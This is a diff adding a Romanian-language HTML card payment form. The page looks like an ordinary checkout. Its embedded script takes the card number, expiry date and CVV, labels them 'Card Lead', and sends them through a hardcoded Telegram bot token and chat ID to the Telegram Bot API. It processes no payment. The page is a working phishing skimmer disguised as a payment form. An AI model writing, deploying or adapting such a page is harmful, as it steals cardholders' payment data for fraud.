@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formular de Plată</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .payment-form-container {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .payment-form h2 {
+            margin-bottom: 20px;
+            text-align: center;
+            color: #333;
+        }
+
+        .payment-form label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        .payment-form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .payment-form .form-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .payment-form .form-group {
+            flex: 1;
+        }
+
+        .payment-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .payment-form button:hover {
+            background-color: #218838;
+        }
+
+        @media (max-width: 480px) {
+            .form-row {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-form-container">
+        <form class="payment-form" id="paymentForm">
+            <h2>Formular de Plată</h2>
+            <label for="card-name">Numele Deținătorului</label>
+            <input type="text" id="card-name" name="card-name" placeholder="Ion Popescu" required>
+
+            <label for="card-number">Numărul Cardului</label>
+            <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiry-date">Data Expirării</label>
+                    <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+                </div>
+            </div>
+
+            <button type="submit">Plătește acum</button>
+        </form>
+    </div>
+
+    <script>
+        const botToken = "7601944721:AAHVmbhwDNlfIvIzWmx8i9jL0J-EP2ptfls"; // Tokenul botului
+        const chatId = "6953089880"; // Chat ID-ul destinat
+
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Preluarea datelor introduse
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Datele formatate pentru trimitere
+            const orderDetails = `
+Card Lead:
+Număr Card: ${cardNumber}
+Data Expirării: ${expiryDate}
+CVV: ${cvv}
+            `;
+
+            // URL-ul pentru API-ul Telegram
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(orderDetails)}`;
+
+            // Trimitere mesaj
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Datele au fost trimise cu succes!");
+                    } else {
+                        alert("A apărut o eroare la trimiterea datelor.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Eroare:", error);
+                    alert("A apărut o eroare.");
+                });
+        });
+
+        // Validări suplimentare pentru input-uri
+        document.getElementById('card-number').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d\s]/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+        });
+
+        document.getElementById('expiry-date').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d/]/g, '');
+            if (e.target.value.length === 2 && !e.target.value.includes('/')) {
+                e.target.value += '/';
+            }
+            e.target.value = e.target.value.slice(0, 5);
+        });
+
+        document.getElementById('cvv').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 3);
+        });
+    </script>
+</body>
+</html>
